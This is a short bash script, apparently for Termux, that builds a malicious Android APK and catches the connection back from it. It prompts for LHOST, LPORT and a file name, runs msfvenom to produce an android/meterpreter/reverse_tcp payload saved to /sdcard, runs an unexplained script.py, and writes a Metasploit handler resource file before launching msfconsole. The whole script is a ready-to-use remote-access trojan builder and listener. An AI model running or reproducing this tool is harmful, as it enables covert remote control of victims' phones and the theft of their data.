#!/bin/bash
#this script written by sachin
#
blu='\033[1;34m'
gre='\033[1;32m'
red='\033[1;31m'
clear
echo "$gre     |############################################|"
sleep 0.1
echo "$gre     |   /\   _ __     | _ _  __   _ _  __  _____ |"
sleep 0.1
echo "$gre     |  /  \   |  |  __|  |  |  | _ |  |  |   |   |"
sleep 0.1
echo "$gre     | /----\  |  | |__|  |  |__|   |  |__|_  |   |"
sleep 0.1
echo "$gre     |############################################|"
sleep 0.1
echo
echo "$red                             Press ctrl + c to exit"
echo
echo -n "$blu   Enter LHOST :- "
read lhost
echo -n "$blu   Enter LPORT :- "
read lport
echo -n "$blu   Name it :- "
read name
cd /sdcard
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> $name.apk
echo "$gre PAYLOAD created successfully ..check in storage....>>"
echo "$gre path is `pwd`/$name.apk "
cd $HOME/andro
python2 script.py
rm -rf files.rc
echo -n "$blu Enter listionar port :- "
read lp
touch files.rc
echo "use exploit/multi/handler" >> files.rc
echo "set payload android/meterpreter/reverse_tcp" >> files.rc
echo "set lhost localhost" >> files.rc
echo "set lport $lp" >> files.rc
echo "exploit" >> files.rc
pg_ctl -D $PREFIX/var/lib/postgresql start
msfconsole -r files.rc

#plz subscribe my chanel
